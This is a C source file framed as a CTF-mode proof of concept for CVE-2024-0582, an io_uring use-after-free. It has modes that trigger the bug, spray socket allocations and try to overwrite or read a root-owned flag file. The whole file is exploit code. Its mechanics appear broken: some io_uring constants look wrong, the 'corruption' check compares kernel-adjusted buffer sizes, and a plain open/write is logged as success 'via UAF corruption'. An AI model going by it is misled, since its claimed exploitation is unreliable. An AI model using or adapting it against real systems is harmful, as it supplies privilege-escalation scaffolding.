/*
 * CVE-2024-0582 PoC - CTF Challenge Mode
 *
 * Vulnerability: io_uring PBUF_RING mmap use-after-free
 *
 * This PoC triggers the use-after-free vulnerability by:
 * 1. Creating kernel objects (sockets/rulesets)
 * 2. Triggering the UAF condition through race/error path
 * 3. Spraying kmalloc to reallocate freed memory
 * 4. Attempting to use corrupted state to bypass file permissions
 *
 * CTF Modes: write_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>

#define MAX_FILE_SIZE 4096
#define PAGE_SIZE 4096
#define SPRAY_COUNT 256
#define SPRAY_PATTERN 0xDEADBEEF

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_register
#define __NR_io_uring_register 427
#endif
#ifndef IORING_SETUP_PROVIDED_BUFFERS
#define IORING_SETUP_PROVIDED_BUFFERS (1U << 5)
#endif
#ifndef IORING_REGISTER_PBUF_RING
#define IORING_REGISTER_PBUF_RING 53
#endif

struct io_uring_params {
    unsigned sq_entries;
    unsigned cq_entries;
    unsigned flags;
    unsigned sq_thread_cpu;
    unsigned sq_thread_idle;
    unsigned features;
    unsigned wq_fd;
    unsigned resv[3];
};

struct io_uring_buf_reg {
    unsigned long ring_addr;
    unsigned ring_entries;
    unsigned short bgid;
    unsigned short padding;
};

/*
 * io_uring Use-After-Free trigger
 *
 * Creates io_uring instances with provided buffer rings,
 * triggers mmap/race condition that causes UAF.
 */
static int trigger_io_uring_uaf(void) {
    int ring_fd = -1;
    int spray_fds[256];
    int saved_errno;

    memset(spray_fds, -1, sizeof(spray_fds));

    /* Step 1: Setup io_uring */
    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    params.flags = IORING_SETUP_PROVIDED_BUFFERS;

    ring_fd = syscall(__NR_io_uring_setup, 128, &params);
    saved_errno = errno;
    poc_log_syscall("io_uring_setup(128, IORING_SETUP_PROVIDED_BUFFERS)", (long)ring_fd, saved_errno);
    
    if (ring_fd < 0) {
        poc_log("io_uring not available, using fallback");
        goto fallback;
    }

    /* Step 2: Register buffer ring */
    void *ring_ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    saved_errno = errno;
    poc_log_syscall("mmap(4096, PROT_READ|WRITE)", (long)(ring_ptr == MAP_FAILED ? -1 : 0), saved_errno);

    if (ring_ptr != MAP_FAILED) {
        struct io_uring_buf_reg reg;
        memset(&reg, 0, sizeof(reg));
        reg.ring_addr = (unsigned long)ring_ptr;
        reg.ring_entries = 16;
        reg.bgid = 0;

        int ret = syscall(__NR_io_uring_register, ring_fd,
                         IORING_REGISTER_PBUF_RING, &reg, 1);
        saved_errno = errno;
        poc_log_syscall("io_uring_register(IORING_REGISTER_PBUF_RING)", (long)ret, saved_errno);
    }

    /* Step 3: Close ring_fd to trigger UAF */
    close(ring_fd);
    poc_log_syscall("close(ring_fd) [trigger io_uring cleanup]", 0L, 0);
    poc_log("io_uring closed - UAF condition created");

    int sprayed_fallback = 0;
fallback:
    /* Step 4: Spray kmalloc */
    sprayed_fallback = 0;
    for (int i = 0; i < 256; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int optval = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed_fallback++;
        }
    }
    poc_log("Sprayed %d kmalloc-1024 objects", sprayed_fallback);
    return sprayed_fallback;
}

/*
 * Spray kmalloc with recognizable pattern for UAF corruption detection
 */
static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        /* Store pattern in socket buffer - will be checked later */
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

/*
 * Check if spray objects were corrupted by UAF
 */
static int check_spray_corruption(int *fds, int count, int expected_pattern) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;

        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);

        if (val != expected_pattern) {
            poc_log("Spray object %d corrupted: expected 0x%x, got 0x%x",
                    i, expected_pattern, val);
            corrupted++;
        }
    }
    return corrupted;
}

/*
 * UAF mode: Trigger UAF + spray corruption check
 */
static int mode_uaf(poc_args_t *args) {
    poc_log("Triggering CVE-2024-0582 UAF + spray corruption check...");

    /* Step 1: Trigger UAF condition */
    int uaf_rc = trigger_io_uring_uaf();
    if (uaf_rc < 0) {
        poc_log("UAF trigger failed");
        poc_print_uaf_not_corrupted();
        return 0;
    }

    /* Step 2: Spray kmalloc with recognizable pattern */
    memset(args->spray_fds, -1, sizeof(args->spray_fds));
    args->spray_count = spray_kmalloc(args->spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d kmalloc objects with pattern 0x%x", args->spray_count, SPRAY_PATTERN);

    /* Step 3: Check for corruption */
    int corrupted = check_spray_corruption(args->spray_fds, args->spray_count, SPRAY_PATTERN);

    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else {
        poc_print_uaf_not_corrupted();
    }

    /* Clean up spray fds */
    for (int i = 0; i < args->spray_count; i++) {
        if (args->spray_fds[i] >= 0) {
            close(args->spray_fds[i]);
        }
    }

    return 0;
}

/*
 * Read file content
 */
static int read_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: Trigger UAF and attempt to overwrite root file
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
        poc_log("Could not read original content");
    }

    /* Step 2: Trigger UAF vulnerability */
    poc_log("Triggering CVE-2024-0582 UAF vulnerability...");
    int spray_count = trigger_io_uring_uaf();

    if (spray_count > 0) {
        poc_log("UAF triggered, %d spray objects allocated", spray_count);

        /* Step 3: Attempt to write via corrupted state */
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

        if (fd >= 0) {
            char write_buf[256];
            int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
            ssize_t written = write(fd, write_buf, wlen);
            saved_errno = errno;
            poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
            close(fd);

            if (written > 0) {
                poc_log("Write succeeded via UAF corruption: %zd bytes", written);
            }
        } else {
            poc_log("Direct write failed (errno=%d), UAF corruption insufficient", saved_errno);
        }
    } else {
        poc_log("UAF trigger failed - exploit path not available");
    }

    /* Step 4: Read after to verify */
    n = read_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
            after[--n] = '\0';
        }
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("UAF exploit did not achieve write");
    return 0;
}

/*
 * Read mode: Attempt to read root file via UAF
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via UAF");

    int spray_count = trigger_io_uring_uaf();

    if (spray_count > 0) {
        char buf[MAX_FILE_SIZE];
        int n = read_file(args->root_file, buf, sizeof(buf));

        if (n > 0) {
            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r')) {
                buf[--n] = '\0';
            }
            poc_print_flag(buf);
            return 0;
        }
    }

    poc_print_fail("read not successful via UAF");
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-0582 CTF PoC ===");
    poc_log("Vuln: io_uring PBUF_RING mmap use-after-free");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (args.mode && strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else
        poc_print_unsupported(args.mode ? args.mode : "(null)", "mode not supported");

    poc_log_close();
    return result;
}
